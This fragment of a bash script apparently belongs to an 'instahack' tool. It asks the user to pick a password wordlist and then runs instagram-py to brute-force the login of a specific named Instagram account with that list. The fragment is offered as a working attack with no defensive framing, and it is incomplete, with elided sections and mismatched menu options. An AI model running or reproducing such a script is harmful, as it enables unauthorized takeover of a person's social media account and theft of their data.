...
read -p "[#]1k passwords worldlist file: " choice
...
if [[ $choice == "1" ]]; then
	...
	instagram-py --username Folami_collection --password-list $HOME/instahack/pass/pass2.txt
elif [[ $choice == "3" ]]; then
	# If the user entered the option for the 1M password wordlist file

	instagram-py --username Folami_collection --password-list $HOME/instahack/pass/pass3.txt
else
